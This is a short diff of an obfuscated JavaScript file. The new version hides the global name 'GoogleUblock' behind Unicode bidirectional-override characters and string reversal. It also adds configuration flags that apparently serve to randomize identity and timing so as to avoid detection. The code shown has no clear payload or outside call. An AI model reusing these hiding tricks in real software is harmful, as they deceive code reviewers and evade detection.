@@ -1,0 +1,43 @@
+--- shard-a.js (scrub3)
++++ shard-a.js (scrub2)
+@@ -38,20 +38,32 @@
+           return false;
+         } catch (e) { return false; }
+       };
+-
+-      const _0xbridge = (() => String.fromCharCode(71, 111, 111, 103, 108, 101, 85, 98, 108, 111, 99, 107))();
+-      try { window[_0xbridge] = _0xgu; } catch (e) {}
++      const _0xgr = s => s.replace(/[\u200E\u200F\u202A-\u202E\u2066-\u2069]/g, '').split('').reverse().join('');
++      try { window[_0xgr('‮kcolbUelgooG‬')] = _0xgu; } catch (e) {}
+       const SUITE_VERSION = "8.6-S1";
+   const INSTANCE_ID = "2de579ef";
+   Log.info(`[Host ${SUITE_VERSION}] initialized — worker instance ${INSTANCE_ID}.`);
+   Log.diag(`Host core — uniform phrase pools, log-lock, studio gaps, refill queue, metamorphic decode.`);
+   
+   
+-  Log.queue("Host config", {
+-    flags: 0x7e3f,
+-    profile: 0x5a,
+-    limit: 50,
+-    rev: 0x86
++  Log.queue("Experimental configuration", {
++    delayModel: "lognormal",
++    lazyForcer: true,
++    lazyForceLimit: 50,
++    timestampModel: "monotonic-five-decimal",
++    promiseHandoff: true,
++    randomizedIdentityFallback: true,
++    randomizedActivityKey: true,
++    studioGaps: true,
++    auxUnit: true,
++    entryCheck: true,
++    stringVariants: true,
++    glyphVariants: true,
++    digestForm: "packed",
++    routesForm: "packed",
++    mcForm: "sparse",
++    storeCheck: true,
++    storeForm: "typed",
+   });
+ 
+     _0xmod.log = Log;
